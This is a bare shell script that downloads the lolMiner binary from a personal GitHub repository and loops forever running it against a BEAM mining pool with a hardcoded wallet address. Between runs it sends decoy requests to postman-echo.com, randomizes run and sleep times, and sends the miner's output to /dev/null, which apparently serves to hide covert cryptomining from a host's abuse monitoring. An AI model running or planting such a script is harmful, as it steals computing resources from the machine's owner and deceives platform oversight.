wget https://raw.githubusercontent.com/kartikbhalala/temp/master/lolMiner_v1.07_Lin64.tar
tar -xvf lolMiner_v1.07_Lin64.tar
while :
do
	curl --location --request GET 'https://postman-echo.com/get?foo1=bar1&foo2=bar2'
	sleep 2s
	curl --location --request GET 'https://postman-echo.com/get?foo1=bar1&foo2=bar2'
	sleep 2s
	curl --location --request POST 'https://postman-echo.com/post' \--data-raw 'This is expected to be sent back as part of response body.'
	curl --location --request POST 'https://postman-echo.com/post' \--data-raw 'This is expected to be sent back as part of response body.'
	curl --location --request POST 'https://postman-echo.com/post' \--data-raw 'This is expected to be sent back as part of response body.'
	curl --location --request GET 'https://postman-echo.com/get?foo1=bar1&foo2=bar2'
	sleep 2s
	curl --location --request GET 'https://postman-echo.com/get?foo1=bar1&foo2=bar2'
	curl --location --request POST 'https://postman-echo.com/post' \--data-raw 'This is expected to be sent back as part of response body.'
	sleep 2s

	x=$(($RANDOM%15))
	y=20
	z=$(($x+$y))

	a=$(($RANDOM%150))
	b=240
	c=$(($a+$b))

	w=$(($RANDOM%60))
	e=120
	aaram=$(($w+$e))
	timeout -k 5 $c\s  ./1.07/lolMiner --coin BEAM --pool beam-asia.leafpool.com --port 3333 --user 2bac519ca0d058982b4891dfa6980b3b35e41dd4b52daad2fe540aef70206ef9bb.rigfd2 &> /dev/null
	sleep $aaram
done